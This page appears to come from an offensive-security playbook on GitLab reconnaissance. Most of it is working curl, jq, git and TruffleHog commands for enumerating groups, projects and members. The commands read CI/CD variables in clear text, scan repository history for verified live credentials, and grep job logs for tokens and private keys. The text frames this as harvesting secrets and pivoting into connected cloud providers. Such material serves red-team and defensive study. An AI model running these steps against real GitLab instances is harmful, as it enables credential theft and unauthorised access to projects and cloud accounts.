---
title: "Reconnaissance"
order: 1
description: "Enumerating GitLab groups, projects, members, and snippets through the v4 REST and GraphQL APIs, reading accessible CI/CD variables, and harvesting secrets from repository contents, commit history, and job logs with a token or anonymous access."
keywords:
  - GitLab reconnaissance
  - api/v4
  - CI/CD variables
  - secret harvesting
  - trufflehog
  - GraphQL
---

# Reconnaissance

Everything you do next depends on knowing the group and project graph, who holds access, and where secrets already sit in reach. On gitlab.com the inventory comes from the REST API at `https://gitlab.com/api/v4` and the GraphQL endpoint at `https://gitlab.com/api/graphql`. A `PRIVATE-TOKEN:` header scopes results to what that token can read; with no header you still see public groups, projects, and snippets, which is often enough to find a leak that upgrades access.

## Fingerprint and token identity first

```bash
# Who am I and what can this token do
curl -s https://gitlab.com/api/v4/user -H "PRIVATE-TOKEN: $TOKEN"
# -> username, id, is_admin (self-managed), and the account this token acts as
curl -s https://gitlab.com/api/v4/personal_access_tokens/self -H "PRIVATE-TOKEN: $TOKEN"
# -> scopes: ["api"], expires_at, revoked; "api" is full read/write
```

An `is_admin: true` on a self-managed instance changes the whole engagement. A `scopes` array containing `api` means the token can both read and write every project it can reach; `read_api` or `read_repository` is narrower.

## Enumerate groups, projects, and members

```bash
# All groups the token sees, then every project under each (pagination matters)
curl -s "https://gitlab.com/api/v4/groups?per_page=100&all_available=true" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[].full_path'
curl -s "https://gitlab.com/api/v4/groups/<group_id>/projects?include_subgroups=true&per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[].path_with_namespace'

# Members, including inherited group membership, reveal targets and privilege
curl -s "https://gitlab.com/api/v4/projects/<id>/members/all?per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[] | "\(.username) access_level=\(.access_level)"'
```

`access_level=50` is Owner, `40` Maintainer, `30` Developer. A Developer or above on a project means you can push a branch and run a pipeline there (see [CI/CD pipeline injection](ci-cd-pipeline-injection.md)). The `all` member list folds in group-inherited roles that the project-only endpoint omits.

## Read CI/CD variables directly

A Maintainer-or-above token reads a project's stored CI/CD variables straight out of the API, with no pipeline needed:

```bash
curl -s "https://gitlab.com/api/v4/projects/<id>/variables" -H "PRIVATE-TOKEN: $TOKEN"
# [{"key":"DEPLOY_KEY","value":"...","protected":false,"masked":true}, ...]
curl -s "https://gitlab.com/api/v4/groups/<group_id>/variables" -H "PRIVATE-TOKEN: $TOKEN"
```

The `value` field is returned in clear here regardless of the `masked` flag; masking only hides values in job logs, not in this API response. Group-level variables are inherited by every project in the group, so a single group read can yield deploy keys and cloud credentials used fleet-wide. A `403` means the token is below Maintainer; fall back to exfiltrating the variables through a pipeline instead.

## Snippets and GraphQL sweeps

```bash
# Public and accessible snippets often hold pasted tokens and config
curl -s "https://gitlab.com/api/v4/snippets/public?per_page=100" | jq -r '.[].web_url'

# GraphQL pulls many fields in one request; good for wide project sweeps
curl -s https://gitlab.com/api/graphql -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ projects(membership:true){ nodes { fullPath, repository { rootRef } } } }"}'
```

## Harvest secrets from repositories, history, and logs

Cloning gives you the whole history, where secrets removed from `HEAD` usually survive in older commits:

```bash
# Clone with the token embedded, then scan all branches and history
git clone https://oauth2:$TOKEN@gitlab.com/<namespace>/<project>.git
trufflehog git file://./<project> --only-verified
# or scan a repo over the API without cloning
trufflehog gitlab --token=$TOKEN --repo=https://gitlab.com/<namespace>/<project>.git
```

`--only-verified` filters to secrets TruffleHog confirmed live against their provider, which cuts noise and tells you the credential still works. Job logs are a second trove: a secret echoed by a build (unmasked, or masked and reassembled) stays in the artifact log.

```bash
# Walk recent jobs and pull their trace logs
curl -s "https://gitlab.com/api/v4/projects/<id>/jobs?per_page=100" -H "PRIVATE-TOKEN: $TOKEN" \
  | jq -r '.[].id' | while read j; do
    curl -s "https://gitlab.com/api/v4/projects/<id>/jobs/$j/trace" -H "PRIVATE-TOKEN: $TOKEN"
  done | grep -iE 'token|secret|password|aws_|BEGIN .*PRIVATE KEY'
```

## Follow-on

A Maintainer token plus readable variables feeds [token abuse](token-abuse.md) directly. A Developer token with no variable read routes to [CI/CD pipeline injection](ci-cd-pipeline-injection.md) to exfiltrate them through a job. Verified cloud or registry credentials from TruffleHog pivot straight out of GitLab into the connected provider.

## Tools

- **TruffleHog** (`trufflehog gitlab`, `trufflehog git`) for verified secret scanning.
- **Gitleaks** for history scanning when cloning locally.
- **glab** (the official CLI) for scripted API enumeration with a stored token.

## References

- [GitLab REST API: projects](https://docs.gitlab.com/ee/api/projects.html)
- [GitLab API: project-level variables](https://docs.gitlab.com/ee/api/project_level_variables.html)
- [TruffleHog GitLab source](https://github.com/trufflesecurity/trufflehog)
- [GitLab GraphQL API reference](https://docs.gitlab.com/ee/api/graphql/reference/)
